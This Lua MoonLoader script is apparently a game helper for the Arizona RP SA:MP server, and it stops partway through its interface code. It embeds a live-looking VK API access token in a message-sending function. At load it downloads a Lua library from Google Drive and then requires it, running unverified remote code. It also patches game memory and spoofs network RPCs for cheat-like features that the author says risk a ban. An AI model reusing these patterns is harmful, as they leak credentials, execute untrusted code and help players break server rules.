script_name("AzRP Helper by Sad_Flores")
script_author("Sad_Flores")
script_version('2.2.R')

--
print('AzRP Helper: Это не я криворукий, а ты ошибся!')
print('Необходимые библиотеки тут -> https://vk.com/gothsad -> Обсуждения -> Библиотеки')

require "lib.moonloader"

local imgui = require 'imgui'
local encoding = require 'encoding'

local memory = require 'memory'
local inicfg = require 'inicfg'

local key = require 'vkeys'
local fa = require 'fAwesome5'

local sampev = require 'lib.samp.events'

local effil = require 'effil'

local encoding = require 'encoding'
encoding.default = 'CP1251'
u8 = encoding.UTF8

local vkerr, vkerrsend -- сообщение с текстом ошибки, nil если все ок

local repeats = 0

function requestRunner() -- создание effil потока с функцией https запроса
	return effil.thread(function(u, a)
		local https = require 'ssl.https'
		local ok, result = pcall(https.request, u, a)
		if ok then
			return {true, result}
		else
			return {false, result}
		end
	end)
end

function char_to_hex(str)
	return string.format("%%%02X", string.byte(str))
  end
  
  function url_encode(str)
	local str = string.gsub(str, "\\", "\\")
	local str = string.gsub(str, "([^%w])", char_to_hex)
	return str
  end
  
  function threadHandle(runner, url, args, resolve, reject) -- обработка effil потока без блокировок
	  local t = runner(url, args)
	  local r = t:get(0)
	  while not r do
		  r = t:get(0)
		  wait(0)
	  end
	  local status = t:status()
	  if status == 'completed' then
		  local ok, result = r[1], r[2]
		  if ok then resolve(result) else reject(result) end
	  elseif err then
		  reject(err)
	  elseif status == 'canceled' then
		  reject(status)
	  end
	  t:cancel(0)
  end
  
  function async_http_request(url, args, resolve, reject)
	  local runner = requestRunner()
	  if not reject then reject = function() end end
	  lua_thread.create(function()
		  threadHandle(runner, url, args, resolve, reject)
	  end)
  end
  
  function vk_request(msg)
	  msg = msg:gsub('{......}', '')
	  msg = u8(msg)
	  msg = url_encode(msg)
	  async_http_request('https://api.vk.com/method/messages.send', 'peer_id=2000000005&message=' .. msg .. '&access_token=c6860d8dc98c694be7ed7d02cacbf5e07e83bae84d4f6d97fb8e0806080e6726ae09d5da8d43d0e4047ba&v=5.80',
	  function (result)
		  local t = decodeJson(result)
		  if not t then
			  print(result)
			  return
		  end
		  if t.error then
			  vkerrsend = 'Ошибка!\nКод: ' .. t.error.error_code .. ' Причина: ' .. t.error.error_msg
			  sampAddChatMessage(string.format("%s", vkerrsend), 0x01A0E9)
			  return
		  end
		  vkerrsend = nil
	  end)
  end


local code_notifications = [[ local imgui_notf = require 'imgui'
local style = imgui_notf.GetStyle()
local colors = style.Colors
local clr = imgui_notf.Col
local ImVec4 = imgui_notf.ImVec4
local encoding = require 'encoding'
u8 = encoding.UTF8
encoding.default = 'CP1251'
imgui_notf.GetStyle().WindowMinSize = imgui_notf.ImVec2(1.0, 1.0)
local ToScreen = convertGameScreenCoordsToWindowScreenCoords
local sX, sY = ToScreen(630, 438)
local message = {}
local msxMsg = 3
local notfList = {
	pos = {
		x = sX - 200,
		y = sY
	},
	npos = {
		x = sX - 200,
		y = sY
	},
	size = {
		x = 200,
		y = 0
	}
}
function setstyle()
	style.WindowRounding = 2.0
	style.WindowTitleAlign = imgui_notf.ImVec2(0.5, 0.5)
	style.ChildWindowRounding = 2.0
	style.FrameRounding = 2.0
	style.ItemSpacing = imgui_notf.ImVec2(5.0, 4.0)
	style.ScrollbarSize = 13.0
	style.ScrollbarRounding = 0
	style.GrabMinSize = 8.0
	style.GrabRounding = 1.0
	-- style.Alpha =
	style.WindowPadding = imgui_notf.ImVec2(4.0, 4.0)
	style.WindowMinSize = imgui_notf.ImVec2(1.0, 1.0)
	style.FramePadding = imgui_notf.ImVec2(3.5, 3.5)
	-- style.ItemInnerSpacing =
	-- style.TouchExtraPadding =
	-- style.IndentSpacing =
	-- style.ColumnsMinSpacing = ?
	style.ButtonTextAlign = imgui_notf.ImVec2(0.0, 0.5)
	-- style.DisplayWindowPadding =
	-- style.DisplaySafeAreaPadding =
	-- style.AntiAliasedLines =
	-- style.AntiAliasedShapes =
	-- style.CurveTessellationTol =

	colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
	colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.71)
	colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
	colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
	colors[clr.ComboBg]                = colors[clr.PopupBg]
	colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
	colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.FrameBg]                = ImVec4(0.12, 0.12, 0.12, 0.94)
	colors[clr.FrameBgHovered]         = ImVec4(0.45, 0.45, 0.45, 0.85)
	colors[clr.FrameBgActive]          = ImVec4(0.63, 0.63, 0.63, 0.63)
	colors[clr.TitleBg]                = ImVec4(0.13, 0.13, 0.13, 0.99)
	colors[clr.TitleBgActive]          = ImVec4(0.13, 0.13, 0.13, 0.99)
	colors[clr.TitleBgCollapsed]       = ImVec4(0.05, 0.05, 0.05, 0.79)
	colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
	colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
	colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
	colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
	colors[clr.CheckMark]              = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.SliderGrab]             = ImVec4(0.28, 0.28, 0.28, 1.00)
	colors[clr.SliderGrabActive]       = ImVec4(0.35, 0.35, 0.35, 1.00)
	colors[clr.Button]                 = ImVec4(0.12, 0.12, 0.12, 0.94)
	colors[clr.ButtonHovered]          = ImVec4(0.34, 0.34, 0.35, 0.89)
	colors[clr.ButtonActive]           = ImVec4(0.21, 0.21, 0.21, 0.81)
	colors[clr.Header]                 = ImVec4(0.12, 0.12, 0.12, 0.94)
	colors[clr.HeaderHovered]          = ImVec4(0.34, 0.34, 0.35, 0.89)
	colors[clr.HeaderActive]           = ImVec4(0.12, 0.12, 0.12, 0.94)
	colors[clr.Separator]              = colors[clr.Border]
	colors[clr.SeparatorHovered]       = ImVec4(0.26, 0.59, 0.98, 0.78)
	colors[clr.SeparatorActive]        = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.ResizeGrip]             = ImVec4(0.26, 0.59, 0.98, 0.25)
	colors[clr.ResizeGripHovered]      = ImVec4(0.26, 0.59, 0.98, 0.67)
	colors[clr.ResizeGripActive]       = ImVec4(0.26, 0.59, 0.98, 0.95)
	colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
	colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
	colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00)
	colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
	colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
	colors[clr.TextSelectedBg]         = ImVec4(0.26, 0.59, 0.98, 0.35)
	colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end
setstyle()
function main()
	while true do
		wait(0)
		imgui_notf.ShowCursor = false
		imgui_notf.Process = true
	end
end
function imgui_notf.OnDrawFrame()
	onRenderNotification()
end
function onRenderNotification()
	local count = 0
	for k, v in ipairs(message) do
		local push = false
		if v.active and v.time < os.clock() then
			v.active = false
		end
		if count < 10 then
			if not v.active then
				if v.showtime > 0 then
					v.active = true
					v.time = os.clock() + v.showtime
					v.showtime = 0
				end
			end
			if v.active then
				count = count + 1
				if v.time + 3.000 >= os.clock() then
					imgui_notf.PushStyleVar(imgui_notf.StyleVar.Alpha, (v.time - os.clock()) / 1.0)
					push = true
				end
				local nText = u8(tostring(v.text))
				notfList.size = imgui_notf.GetFont():CalcTextSizeA(imgui_notf.GetFont().FontSize, 200.0, 196.0, nText)
				notfList.pos = imgui_notf.ImVec2(notfList.pos.x, notfList.pos.y - (notfList.size.y + (count == 1 and 8 or 13)))
				imgui_notf.SetNextWindowPos(notfList.pos, _, imgui_notf.ImVec2(0.0, 0.0))
				imgui_notf.SetNextWindowSize(imgui_notf.ImVec2(200, notfList.size.y + imgui_notf.GetStyle().ItemSpacing.y + imgui_notf.GetStyle().WindowPadding.y))
				imgui_notf.Begin(u8'##msg' .. k, _, imgui_notf.WindowFlags.NoCollapse + imgui_notf.WindowFlags.NoResize + imgui_notf.WindowFlags.NoScrollbar + imgui_notf.WindowFlags.NoMove + imgui_notf.WindowFlags.NoTitleBar)
				imgui_notf.TextWrapped(nText)
				imgui_notf.End()
				if push then
					imgui_notf.PopStyleVar()
				end
			end
		end
	end
	sX, sY = ToScreen(630, 438)
	notfList = {
		pos = {
			x = sX - 200,
			y = sY
		},
		npos = {
			x = sX - 200,
			y = sY
		},
		size = {
			x = 200,
			y = 0
		}
	}
end
function EXPORTS.addNotification(text, time)
	message[#message+1] = {active = false, time = 0, showtime = time, text = text}
end]]

if not doesFileExist('moonloader/arz_imgui_notf.lua') then
	local f = io.open('moonloader/arz_imgui_notf.lua', "w")
	if f then
		f:write(code_notifications)
		f:close()
		bNotf, notf = pcall(import, "\\arz_imgui_notf.lua")
		arzmessage = function(message)
			notf.addNotification('AzRP Helper by Sad_Flores\n' ..message, 5)
		end
	else
		return
	end
else
	bNotf, notf = pcall(import, "\\arz_imgui_notf.lua")
	arzmessage = function(message)
		notf.addNotification('AzRP Helper by Sad_Flores\n' ..message, 5)
	end
end


if not doesFileExist("moonloader/lib/fAwesome5.lua") then
	downloadUrlToFile("https://drive.google.com/uc?export=download&id=12yp9hvOZIWkyu3wf39cDiJPgMCSVA67l", "moonloader/lib/fAwesome5.lua")
end
if not doesFileExist("moonloader/resource/fonts/fa-solid-900.ttf") then
	downloadUrlToFile("https://drive.google.com/uc?export=download&id=1Xv_-X37Nm0aIn1SHwLbmvfw-gquDQrRH", "moonloader/resource/fonts/fa-solid-900.ttf")
end
if not doesFileExist("moonloader/lib/fontawesome-webfont.ttf") then
	downloadUrlToFile("https://drive.google.com/uc?authuser=0&id=1BPaovp_VrLt-tZ_CqypZmJtMEpg0ve-J&export=download", "moonloader/lib/fontawesome-webfont.ttf")
end


function apply_custom_style()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    local ImVec2 = imgui.ImVec2
 
     style.WindowPadding = ImVec2(15, 15)
     style.WindowRounding = 15.0
     style.FramePadding = ImVec2(5, 5)
     style.ItemSpacing = ImVec2(12, 8)
     style.ItemInnerSpacing = ImVec2(8, 6)
     style.IndentSpacing = 25.0
     style.ScrollbarSize = 15.0
     style.ScrollbarRounding = 15.0
     style.GrabMinSize = 15.0
     style.GrabRounding = 7.0
     style.ChildWindowRounding = 8.0
     style.FrameRounding = 6.0
   
 
       colors[clr.Text] = ImVec4(0.95, 0.96, 0.98, 1.00)
       colors[clr.TextDisabled] = ImVec4(0.36, 0.42, 0.47, 1.00)
       colors[clr.WindowBg] = ImVec4(0.11, 0.15, 0.17, 1.00)
       colors[clr.ChildWindowBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
       colors[clr.PopupBg] = ImVec4(0.08, 0.08, 0.08, 0.94)
       colors[clr.Border] = ImVec4(0.43, 0.43, 0.50, 0.50)
       colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
       colors[clr.FrameBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
       colors[clr.FrameBgHovered] = ImVec4(0.12, 0.20, 0.28, 1.00)
       colors[clr.FrameBgActive] = ImVec4(0.09, 0.12, 0.14, 1.00)
       colors[clr.TitleBg] = ImVec4(0.09, 0.12, 0.14, 0.65)
       colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51)
       colors[clr.TitleBgActive] = ImVec4(0.08, 0.10, 0.12, 1.00)
       colors[clr.MenuBarBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
       colors[clr.ScrollbarBg] = ImVec4(0.02, 0.02, 0.02, 0.39)
       colors[clr.ScrollbarGrab] = ImVec4(0.20, 0.25, 0.29, 1.00)
       colors[clr.ScrollbarGrabHovered] = ImVec4(0.18, 0.22, 0.25, 1.00)
       colors[clr.ScrollbarGrabActive] = ImVec4(0.09, 0.21, 0.31, 1.00)
       colors[clr.ComboBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
       colors[clr.CheckMark] = ImVec4(0.28, 0.56, 1.00, 1.00)
       colors[clr.SliderGrab] = ImVec4(0.28, 0.56, 1.00, 1.00)
       colors[clr.SliderGrabActive] = ImVec4(0.37, 0.61, 1.00, 1.00)
       colors[clr.Button] = ImVec4(0.20, 0.25, 0.29, 1.00)
       colors[clr.ButtonHovered] = ImVec4(0.28, 0.56, 1.00, 1.00)
       colors[clr.ButtonActive] = ImVec4(0.06, 0.53, 0.98, 1.00)
       colors[clr.Header] = ImVec4(0.20, 0.25, 0.29, 0.55)
       colors[clr.HeaderHovered] = ImVec4(0.26, 0.59, 0.98, 0.80)
       colors[clr.HeaderActive] = ImVec4(0.26, 0.59, 0.98, 1.00)
       colors[clr.ResizeGrip] = ImVec4(0.26, 0.59, 0.98, 0.25)
       colors[clr.ResizeGripHovered] = ImVec4(0.26, 0.59, 0.98, 0.67)
       colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
       colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
       colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
       colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
       colors[clr.PlotLines] = ImVec4(0.61, 0.61, 0.61, 1.00)
       colors[clr.PlotLinesHovered] = ImVec4(1.00, 0.43, 0.35, 1.00)
       colors[clr.PlotHistogram] = ImVec4(0.90, 0.70, 0.00, 1.00)
       colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
       colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
       colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
 end
 apply_custom_style()

local load_settings = inicfg.load(
{
	settings =
	{
		fast_connect_active = true,
		anti_afk_active = false,
		azrp_emu_active = false,
		anti_stealer_active = true,
		buffer_cleaner_active = true,
		tuning_fix_active = true,
		fast_load_active = true,
		new_tab_active = false,
		auto_eat = true,
        status_bar_active = false,
        tab_fix_active = false,
        t_fix_active = false,
        anti_rvanka_active = false,
        auto_gun_active = false,
        auto_armour_active = false,
        auto_mask_active = false
	},
	settings_script =
	{
		activate_script = "4"
	}
})

function string.split(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={} ; i=1
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            t[i] = str
            i = i + 1
    end
    return t
end

function strToIdKeys(str)
	tKeys = string.split(str, "+")
	if #tKeys ~= 0 then
		for i = 1, #tKeys do
			if i == 1 then
				str = key.name_to_id(tKeys[i], false)
			else
				str = str .. " " .. key.name_to_id(tKeys[i], false)
			end
		end
		return tostring(str)
	else
		return "(("
	end
end

function isKeysDown(keylist, pressed)
    local tKeys = string.split(keylist, " ")
    if pressed == nil then
        pressed = false
    end
    if tKeys[1] == nil then
        return false
    end
    local bool = false
    local key = #tKeys < 2 and tonumber(tKeys[1]) or tonumber(tKeys[2])
    local modified = tonumber(tKeys[1])
    if #tKeys < 2 then
        if not isKeyDown(VK_RMENU) and not isKeyDown(VK_LMENU) and not isKeyDown(VK_LSHIFT) and not isKeyDown(VK_RSHIFT) and not isKeyDown(VK_LCONTROL) and not isKeyDown(VK_RCONTROL) then
            if wasKeyPressed(key) and not pressed then
                bool = true
            elseif isKeyDown(key) and pressed then
                bool = true
            end
        end
    else
        if isKeyDown(modified) and not wasKeyReleased(modified) then
            if wasKeyPressed(key) and not pressed then
                bool = true
            elseif isKeyDown(key) and pressed then
                bool = true
            end
        end
    end
    if nextLockKey == keylist then
        if pressed and not wasKeyReleased(key) then
            bool = false
        else
            bool = false
            nextLockKey = ""
        end
    end
    return bool
end

local fa_font = nil
local fa_glyph_ranges = imgui.ImGlyphRanges({ fa.min_range, fa.max_range })
function imgui.BeforeDrawFrame()
    if fa_font == nil then
        local font_config = imgui.ImFontConfig() -- to use 'imgui.ImFontConfig.new()' on error
        font_config.MergeMode = true

        fa_font = imgui.GetIO().Fonts:AddFontFromFileTTF('moonloader/lib/fa-solid-900.ttf', 13.0, font_config, fa_glyph_ranges)
    end
end

encoding.default = 'CP1251' 
u8 = encoding.UTF8

local main_window_state = imgui.ImBool(false)

local status_bar_active = imgui.ImBool(load_settings.settings.status_bar_active)
local fast_connect_active = imgui.ImBool(load_settings.settings.fast_connect_active)
local anti_afk_active = imgui.ImBool(load_settings.settings.anti_afk_active)
local azrp_emu_active = imgui.ImBool(load_settings.settings.azrp_emu_active)
local anti_stealer_active = imgui.ImBool(load_settings.settings.anti_stealer_active)
local buffer_cleaner_active = imgui.ImBool(load_settings.settings.buffer_cleaner_active)
local tuning_fix_active = imgui.ImBool(load_settings.settings.tuning_fix_active)
local fast_load_active = imgui.ImBool(load_settings.settings.fast_load_active)
local new_tab_active = imgui.ImBool(false)
local auto_eat = imgui.ImBool(load_settings.settings.auto_eat)
local del_player_active = imgui.ImBool(false)
local del_car_active = imgui.ImBool(false)
local del_object_active = imgui.ImBool(false)
local tab_fix_active = imgui.ImBool(load_settings.settings.tab_fix_active)
local t_fix_active = imgui.ImBool(load_settings.settings.t_fix_active)
local anti_rvanka_active = imgui.ImBool(load_settings.settings.anti_rvanka_active)
local auto_gun_active = imgui.ImBool(load_settings.settings.auto_gun_active)
local auto_armour_active = imgui.ImBool(load_settings.settings.auto_armour_active)
local auto_mask_active = imgui.ImBool(load_settings.settings.auto_mask_active)

local show_menu = 0
local take_damage = false

local function patch()
	if load_settings.settings.fast_load_active == true then
		if memory.getuint8(0x748C2B) == 0xE8 then
			memory.fill(0x748C2B, 0x90, 5, true)
		elseif memory.getuint8(0x748C7B) == 0xE8 then
			memory.fill(0x748C7B, 0x90, 5, true)
		end
		if memory.getuint8(0x5909AA) == 0xBE then
			memory.write(0x5909AB, 1, 1, true)
		end
		if memory.getuint8(0x590A1D) == 0xBE then
			memory.write(0x590A1D, 0xE9, 1, true)
			memory.write(0x590A1E, 0x8D, 4, true)
		end
		if memory.getuint8(0x748C6B) == 0xC6 then
			memory.fill(0x748C6B, 0x90, 7, true)
		elseif memory.getuint8(0x748CBB) == 0xC6 then
			memory.fill(0x748CBB, 0x90, 7, true)
		end
		if memory.getuint8(0x590AF0) == 0xA1 then
			memory.write(0x590AF0, 0xE9, 1, true)
			memory.write(0x590AF1, 0x140, 4, true)
		end
	end
end

patch()

function imgui.TextQuestion(text)
    imgui.TextDisabled('(?)')
    if imgui.IsItemHovered() then
        imgui.BeginTooltip()
        imgui.PushTextWrapPos(450)
        imgui.TextUnformatted(text)
        imgui.PopTextWrapPos()
        imgui.EndTooltip()
    end
end

local function send_player_stream(id, i)
	if i then
		local bs = raknetNewBitStream()
		raknetBitStreamWriteInt16(bs, id)
		raknetBitStreamWriteInt8(bs, i[1])
		raknetBitStreamWriteInt32(bs, i[2])
		raknetBitStreamWriteFloat(bs, i[3].x)
		raknetBitStreamWriteFloat(bs, i[3].y)
		raknetBitStreamWriteFloat(bs, i[3].z)
		raknetBitStreamWriteFloat(bs, i[4])
		raknetBitStreamWriteInt32(bs, i[5])
		raknetBitStreamWriteInt8(bs, i[6])
		raknetEmulRpcReceiveBitStream(32, bs)
	end
end

local mapp = 
{
	1000,
	1001,
	1002,
	1003,
	1004,
	1005,
	1006,
	1007,
	1011,
	1012,
	1013,
	1014,
	1015,
	1016,
	1017,
	1018,
	1019,
	1020,
	1021,
	1022,
	1023,
	1024,
	1025,
	1026,
	1027,
	1028,
	1029,
	1030,
	1031,
	1032,
	1033,
	1034,
	1035,
	1036,
	1037,
	1038,
	1039,
	1040,
	1041,
	1042,
	1043,
	1044,
	1045,
	1046,
	1047,
	1048,
	1049,
	1050,
	1051,
	1052,
	1053,
	1054,
	1055,
	1056,
	1057,
	1058,
	1059,
	1060,
	1061,
	1062,
	1063,
	1064,
	1065,
	1066,
	1067,
	1068,
	1069,
	1070,
	1071,
	1072,
	1073,
	1074,
	1075,
	1076,
	1077,
	1078,
	1079,
	1080,
	1081,
	1082,
	1083,
	1084,
	1085,
	1088,
	1089,
	1090,
	1091,
	1092,
	1093,
	1094,
	1095,
	1096,
	1097,
	1098,
	1099,
	1100,
	1101,
	1102,
	1103,
	1104,
	1105,
	1106,
	1107,
	1108,
	1110,
	1111,
	1112,
	1113,
	1114,
	1115,
	1116,
	1117,
	1118,
	1119,
	1120,
	1121,
	1122,
	1123,
	1124,
	1125,
	1126,
	1127,
	1128,
	1129,
	1130,
	1131,
	1132,
	1133,
	1134,
	1135,
	1136,
	1137,
	1138,
	1139,
	1140,
	1141,
	1142,
	1143,
	1144,
	1145,
	1146,
	1147,
	1148,
	1149,
	1150,
	1151,
	1152,
	1153,
	1154,
	1155,
	1156,
	1157,
	1158,
	1159,
	1160,
	1161,
	1162,
	1163,
	1164,
	1165,
	1166,
	1167,
	1168,
	1169,
	1170,
	1171,
	1172,
	1173,
	1174,
	1175,
	1176,
	1177,
	1178,
	1179,
	1180,
	1181,
	1182,
	1183,
	1184,
	1185,
	1186,
	1187,
	1188,
	1189,
	1190,
	1191,
	1192,
	1193,
	1327, 
	19741,
	3438,
	16101,
	19633,
	18835,
	2369,
	2411,
	2705,
	2829,
	2028,
	2103,
	2101,
	2105,
	2106,
	2316,
	2318,
	2369,
	2384,
	2404,
	2405,
	2406,
	2484,
	2485,
	2704,
	2852,
	2706,
	2705,
	2714,
	2854,
	2726,
	2828,
	1957,
	1785,
	1783,
	11704,
	11719,
	11718,
	11735,
	14705,
	19352,
	19878,
	19637,
	19638,
	19807,
	19584,
	19585,
	19624,
	19527,
	19736,
	18849,
	1807,
	2248,
	2654,
	15038,
	2241,
}

function deletePlayer(id)
    local bitStream = raknetNewBitStream()
    raknetBitStreamWriteInt16(bitStream, id)
    raknetEmulRpcReceiveBitStream(163, bitStream)
    raknetDeleteBitStream(bitStream)
end

local DEL_PLAYER = false
local DEL_CAR = false
local del_object = false

local npc, infnpc = {}, {}

function imgui.OnDrawFrame()
    local resX, resY = getScreenResolution()
	if main_window_state.v then
        imgui.SetNextWindowPos(imgui.ImVec2(resX / 2, resY / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.SetNextWindowSize(imgui.ImVec2(924, 460), imgui.Cond.FirstUseEver)
        
        imgui.Begin(u8'AzRP Helper | Sad_Flores', main_window_state, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoScrollbar)
        --
        imgui.BeginChild("#menu", imgui.ImVec2(150, 400), true)
        imgui.CenterText(u8 'Меню')

        -- 
        imgui.CenterText(u8 '\nОсновное')
        imgui.Separator()

        if imgui.Selectable(fa.ICON_FA_INFO .. u8'  Немного о скрипте', imgui.ImBool(false), imgui.ImVec2(40, 20)) then show_menu = 0 end
        if imgui.Selectable(fa.ICON_FA_TASKS .. u8' Функционал', imgui.ImBool(false), imgui.ImVec2(40, 20)) then show_menu = 1 end
        if imgui.Selectable(fa.ICON_FA_ROBOT .. u8' Биндер', imgui.ImBool(false), imgui.ImVec2(40, 20)) then show_menu = 2 end
        if imgui.Selectable(fa.ICON_FA_CLIPBOARD_LIST .. u8' Лог разработки', imgui.ImBool(false), imgui.ImVec2(40, 20)) then show_menu = 3 end
        --
        imgui.CenterText(u8 '\nОстальное')
        imgui.Separator()
        if imgui.Selectable(fa.ICON_FA_DOWNLOAD .. u8' Репозиторий', imgui.ImBool(false), imgui.ImVec2(40, 20)) then autoupdate("https://raw.githubusercontent.com/K1NDER-ai/AzRPHelper/master/version.json", '['..string.upper(thisScript().name)..']: ', "https://raw.githubusercontent.com/K1NDER-ai/AzRPHelper/master/version.json") end
        if imgui.Selectable(fa.ICON_FA_AT .. u8' Разработчик', imgui.ImBool(false), imgui.ImVec2(40, 20)) then arzmessage("Александр Матвиенко\nvk.com/decoyha") end
        --
		
		imgui.EndChild()
        -- 
        imgui.SameLine()
        imgui.BeginChild("#funcs", imgui.ImVec2(732, 400), true)
        if show_menu == 0 then
            imgui.Text("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAzRP - Helper by Sad_Flores")
			imgui.Text(u8'\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tВерсия: '.. thisScript().version ..'')
			imgui.Text(u8"Автор: Sad_Flores.")
			imgui.Text(u8"\nСкрипт создан для помощи игрокам Ariznoa RolePlay, в который вложено много усилий.")
			imgui.Text(u8"С самого начала он позиционировался как легальный AzRP Helper, за который не будет бана.")
			imgui.Text(u8"Но в первых версиях был нелегальный функционал, даже тот же замененный таб имеел чит-особенность.")
			imgui.Text(u8"Многим я говорил, что работа над скриптом закончена, позже игроки начали находить меня на сервере.")
			imgui.Text(u8"И спрашивать о данном скрипте, да я видел комментрии о множестве багов и решил переписать его с 0.")
			imgui.Text(u8"\nОпустим лирику, перейдем к сути, все функции которые тут имеются работают стабильно.")
			imgui.Text(u8"Все переписано с 0, изменен дизайн, переписана логика работы скрипта, убрано лишнее.")
			imgui.Text(u8"Так же добавил немного новых функций, скрипт так же имеет автообновление, ничего качать не надо.")
			imgui.Text(u8"\nСпасибо за участие в жизни скрипта.")
			imgui.Text(u8"С любовью Sad_Flores.")
        end

        if show_menu == 1 then
            -- CentralCleaner
            imgui.BeginChild("#CentralCleaner", imgui.ImVec2(215, 150), true)
            imgui.CenterText(u8 'CentralCleaner')
            imgui.SameLine()
            imgui.TextQuestion(u8'Данный раздел отвечает за очистку Центрального рынка.')
            imgui.Separator()
            if imgui.Checkbox(u8'Удаление игроков', del_player_active) then
                DEL_PLAYER = not DEL_PLAYER
                for _, handle in ipairs(getAllChars()) do
                    if doesCharExist(handle) then
                        local _, id = sampGetPlayerIdByCharHandle(handle)
                        if id ~= myid then
                            deletePlayer(id)
                            npc[#npc + 1] = id
                        end
                    end
                end
                
                if not DEL_PLAYER then
                    for i = 1, #npc do
                        send_player_stream(npc[i], infnpc[npc[i]])
                        npc[i] = nil
                    end
                end
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Удаляет игроков с ЦР(Возможен бан).')

            if imgui.Checkbox(u8'Удаление транспорта', del_car_active) then
                DEL_CAR = not DEL_CAR
                for k, v in ipairs(getAllVehicles()) do
                    deleteCar(v)
                end
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Удаляет транспорт с ЦР(Возможен бан).')
            if imgui.Checkbox(u8'Удаление объектов', del_object_active) then
                del_object = not del_object
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Удаляет объекты с ЦР.')
            imgui.EndChild()
            --
            imgui.SameLine()
            -- SAMPHACK
            imgui.BeginChild("#SampHack", imgui.ImVec2(150, 150), true)
            imgui.CenterText(u8 'SampHack')
            imgui.SameLine()
            imgui.TextQuestion(u8'Раздел отвечающий за изменение памяти SA:MP`a.')
            imgui.Separator()
            if imgui.Checkbox('FastConnect', fast_connect_active) then
				memory.fill(sampGetBase() + 0x2D3C45, 0, 0, true)
	
				load_settings.settings.fast_connect_active = not load_settings.settings.fast_connect_active
				inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Уберает задержку переподключения к серверу.')

            if imgui.Checkbox('FastLoad', fast_load_active) then
				load_settings.settings.fast_load_active = not load_settings.settings.fast_load_active
				inicfg.save(load_settings)
			end
			imgui.SameLine()
            imgui.TextQuestion(u8'Убирает полосу загрузки SA:MPa.')

            if imgui.Checkbox('AntiAFK', anti_afk_active) then
                load_settings.settings.anti_afk_active = not load_settings.settings.anti_afk_active
                if load_settings.settings.anti_afk_active then
                    memory.setuint8(7634870, 1, false)
                    memory.setuint8(7635034, 1, false)
                    memory.fill(7623723, 144, 8, false)
                    memory.fill(5499528, 144, 6, false)
                else
                    memory.setuint8(7634870, 0, false)
                    memory.setuint8(7635034, 0, false)
                    memory.hex2bin('0F 84 7B 01 00 00', 7623723, 8)
                    memory.hex2bin('50 51 FF 15 00 83 85 00', 5499528, 6)
                end
				inicfg.save(load_settings)
			end
			imgui.SameLine()
            imgui.TextQuestion(u8'Новый AntiAFK который я постил на БХ.')
            imgui.EndChild()
            --
            imgui.SameLine()
            -- FIX
            imgui.BeginChild("#FIX", imgui.ImVec2(150, 150), true)
            imgui.CenterText(u8 'FIX')
            imgui.SameLine()
            imgui.TextQuestion(u8'Раздел отвечающий за исправление багов игры и сервера.')
            imgui.Separator()
            if imgui.Checkbox('TuningFix', tuning_fix_active) then
				load_settings.settings.tuning_fix_active = not load_settings.settings.tuning_fix_active
				inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Исправляет баг когда из-за тюнинга ТС кидает в разные стороны.')

            if imgui.Checkbox('TabFix', tab_fix_active) then
                load_settings.settings.tab_fix_active = not load_settings.settings.tab_fix_active
                inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Исправляет баг обновления пресонажей при открытом табе.')

